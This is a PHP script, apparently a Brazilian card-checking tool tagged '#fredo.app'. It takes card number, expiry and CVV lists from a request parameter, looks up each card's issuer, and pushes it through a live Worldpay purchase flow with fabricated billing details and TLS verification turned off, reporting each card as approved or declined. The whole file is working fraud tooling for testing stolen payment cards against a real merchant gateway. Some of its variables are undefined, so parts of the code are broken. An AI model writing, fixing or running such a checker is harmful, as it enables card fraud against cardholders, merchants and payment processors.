<?php


set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cartao = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);


$banco = getStr($fim, '"bank":{"name":"', '"');
$pais = getStr($fim, '"name":"', '"');
$nivel = getStr($fim, '"brand":"', '"');

if(strpos($fim, '"type":"credit"') !== false) {
	$tipo = 'Credito';
} else {
	$tipo = 'Debito';
}


$valor = array('1,50 R$', '4,50 R$', '2,50 R$','1,75 R$','5,75 R$','1,00 R$','2,00 R$','5,00 R$','10,00 R$','1,20 R$','2,20 R$','4,20 R$','5,20 R$','0,50 R$','0,20 R$','0,50 R$' );
shuffle($valor);
$debitou = current($valor);



if($explode[0][0] == "4"){
    $tipo = "op-DPChoose-VISA^SSL";
  }
  
  elseif($explode[0][0] == "5"){
    $tipo = "op-DPChoose-ECMC^SSL";
  }


  elseif($explode[0][0] == "3"){
  $tipo = "op-DPChoose-AMEX^SSL";
  }


$random = substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz", 8)), 0, 8);
$ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, "https://secure.worldpay.com/wcc/purchase?instId=1022287&testMode=0&cartId=1&Currency=GBP&amount=10");
      curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
            curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0');
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_ENCODING, "gzip");
      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                                            'Content-Type: application/x-www-form-urlencoded',
                      'X-Requested-With: XMLHttpRequest',
                                            'Connection: Keep-Alive'
                                            ));
      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
            curl_setopt($ch, CURLOPT_VERBOSE, 1);
            curl_setopt($ch, CURLOPT_POST, 0);       
            curl_setopt($ch, CURLOPT_REFERER, '');
      //curl_setopt($ch, CURLOPT_POSTFIELDS, "");
      $a = curl_exec($ch);
      $PaymentID = value($a, 'NAME=PaymentID VALUE="','"');
      

      curl_setopt($ch, CURLOPT_URL, "https://secure.worldpay.com/wcc/purchase");
      curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
            curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0');
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_ENCODING, "gzip");
      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                                            'Content-Type: application/x-www-form-urlencoded',
                      'X-Requested-With: XMLHttpRequest',
                                            'Connection: Keep-Alive'
                                            ));
      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
            curl_setopt($ch, CURLOPT_VERBOSE, 1);
            curl_setopt($ch, CURLOPT_POST, 0);       
            curl_setopt($ch, CURLOPT_REFERER, '');
      curl_setopt($ch, CURLOPT_POSTFIELDS, "PaymentID=".$PaymentID."&Lang=pt&authCurrency=GBP&op-DPChoose-ECMC^SSL.x=55&op-DPChoose-ECMC^SSL.y=17");
      $b = curl_exec($ch);
      
      curl_setopt($ch, CURLOPT_URL, "https://secure.worldpay.com/wcc/card");
      curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
            curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0');
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_ENCODING, "gzip");
      curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                                            'Content-Type: application/x-www-form-urlencoded',
                      'X-Requested-With: XMLHttpRequest',
                                            'Connection: Keep-Alive'
                                            ));
      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
            curl_setopt($ch, CURLOPT_VERBOSE, 1);
            curl_setopt($ch, CURLOPT_POST, 0);       
            curl_setopt($ch, CURLOPT_REFERER, '');
      curl_setopt($ch, CURLOPT_POSTFIELDS, "PaymentID=".$PaymentID."&Lang=pt&cardNoInput=".$cartao."&cardNoJS=&cardNoHidden=*oculto*&cardCVV=010&cardExp.day=32&cardExp.time=".$cardExp_Time."&cardExp.month=".$mes."&cardExp.year=".$ano."&name=".$random."+asdas&address1=asdasd+".$random."&address2=&address3=&town=asdasd+".$random."&region=&postcode=&country=BR&tel=&fax=&email=".$random."%40hotmail.com&op-PMMakePayment.x=14&op-PMMakePayment.y=7");
      $c = curl_exec($ch);

include("bin.php");
$bin = ''.$banco.' ('.$pais.') '.$nivel.' - '.$tipo.'';

if (strpos($c, 'auth.bb')) { 
  echo "APROVADA $cartao|$mes|$ano|$cvv  $bin  Retorno: QR CODE #fredo.app";
  }



  else {
 echo "REPROVADA $cartao|$mes|$ano|$cvv  $bin  #fredo.app";
  }
  
curl_close($ch);
ob_flush();
?>